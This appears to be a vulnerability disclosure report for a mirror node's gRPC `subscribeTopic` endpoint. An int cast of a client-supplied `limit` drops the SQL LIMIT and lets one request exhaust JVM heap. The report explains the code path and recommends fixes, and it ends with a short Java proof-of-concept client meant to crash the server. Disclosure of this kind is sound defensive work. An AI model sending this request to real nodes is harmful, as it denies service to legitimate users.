### Title
Integer Overflow in `setMaxResults` Cast Bypasses SQL LIMIT, Enabling Heap Exhaustion via Unbounded `getResultList()` Load

### Summary
An unprivileged gRPC client can send a `ConsensusTopicQuery` with `limit` set to any value greater than `Integer.MAX_VALUE` (e.g., `Long.MAX_VALUE`). The cast `(int) filter.getLimit()` in `TopicMessageRepositoryCustomImpl.findByFilter()` overflows to `-1`, which Hibernate interprets as "no limit," causing `getResultList()` to load every matching row from the `topic_message` table into JVM heap memory at once. This can exhaust heap, crash the gRPC process, and terminate all active Hashgraph history delivery streams.

### Finding Description

**Entry point — no upper-bound validation on `limit`:**

`TopicMessageFilter.limit` carries only a `@Min(0)` constraint with no `@Max`. [1](#0-0) 

**Controller maps raw protobuf `uint64` directly to the filter:**

`ConsensusController.toFilter()` passes `query.getLimit()` (a raw `long`) straight into the builder with no capping. [2](#0-1) 

**Integer overflow neutralises `setMaxResults`:**

```java
if (filter.hasLimit()) {
    typedQuery.setMaxResults((int) filter.getLimit());   // line 52
}
``` [3](#0-2) 

When `filter.getLimit()` is `Long.MAX_VALUE` (`0x7FFFFFFFFFFFFFFF`), the narrowing cast `(int)` retains only the lower 32 bits: `0xFFFFFFFF = -1`. Hibernate treats `setMaxResults(-1)` as the unset/default state, meaning **no SQL `LIMIT` clause is emitted**.

**Eager full-table load:**

```java
return typedQuery.getResultList().stream();   // line 60
``` [4](#0-3) 

`getResultList()` materialises the entire result set into a `java.util.List` in heap memory before any reactive back-pressure or `flux.take()` can act. The comment on this line even acknowledges that `getResultStream()` was intentionally avoided, making the eager load a deliberate design choice that is now exploitable.

**Reactive `take()` is too late:**

`TopicMessageServiceImpl` applies `flux.take(filter.getLimit())` only after the repository has already returned the fully-loaded list. [5](#0-4) 

### Impact Explanation

A single malicious `subscribeTopic` call with `limit = Long.MAX_VALUE` and a `startTime` of `0` (epoch) against a topic with millions of historical messages will cause the JVM to attempt to allocate a `List` containing every row. On a production mirror node with tens of millions of HCS messages, this reliably triggers `OutOfMemoryError`, crashing the gRPC process and terminating every in-flight Hashgraph history stream for all legitimate subscribers. Because the gRPC service is stateless and the attack is repeatable, the attacker can keep the service down indefinitely.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is unauthenticated and publicly reachable. The protobuf field `limit` is `uint64`, so any standard gRPC client library can set it to `Long.MAX_VALUE` (or any value above `Integer.MAX_VALUE`) with a single line of code. No credentials, no special knowledge of the system, and no rate-limiting on the historical retrieval path are required. The attack is trivially repeatable and scriptable.

### Recommendation

1. **Add a `@Max` constraint** on `TopicMessageFilter.limit` (e.g., `@Max(10_000)` or a configurable property) to reject oversized requests at validation time.
2. **Fix the narrowing cast**: use `Math.min(filter.getLimit(), Integer.MAX_VALUE)` before passing to `setMaxResults`, or use a `long`-aware pagination approach.
3. **Replace `getResultList()` with `getResultStream()`** and resolve the reactive-stream incompatibility separately, so results are streamed lazily rather than materialised in full.
4. **Enforce a server-side page size cap** in the retriever layer independent of the client-supplied limit, similar to how `SharedPollingTopicListener` already uses `listenerProperties.getMaxPageSize()`. [6](#0-5) 

### Proof of Concept

```java
// Standard gRPC Java client, no authentication required
ManagedChannel channel = ManagedChannelBuilder.forAddress("mirror-node-host", 5600)
    .usePlaintext()
    .build();

ConsensusServiceGrpc.ConsensusServiceBlockingStub stub =
    ConsensusServiceGrpc.newBlockingStub(channel);

ConsensusTopicQuery query = ConsensusTopicQuery.newBuilder()
    .setTopicID(TopicID.newBuilder().setTopicNum(1).build())
    .setConsensusStartTime(Timestamp.newBuilder().setSeconds(0).build())
    .setLimit(Long.MAX_VALUE)   // overflows to -1 in (int) cast → no SQL LIMIT
    .build();

// This call triggers findByFilter() → setMaxResults(-1) → getResultList()
// loads ALL topic_message rows into heap → OOM → service crash
Iterator<ConsensusTopicResponse> responses = stub.subscribeTopic(query);
responses.next(); // blocks until OOM kills the server
```

**Trigger path:**
`ConsensusController.subscribeTopic()` → `toFilter()` (limit = `Long.MAX_VALUE`) → `TopicMessageServiceImpl.subscribeTopic()` → `topicMessageRetriever.retrieve()` → `TopicMessageRepositoryCustomImpl.findByFilter()` → `setMaxResults((int) Long.MAX_VALUE)` = `setMaxResults(-1)` → no SQL LIMIT → `getResultList()` → `OutOfMemoryError`.
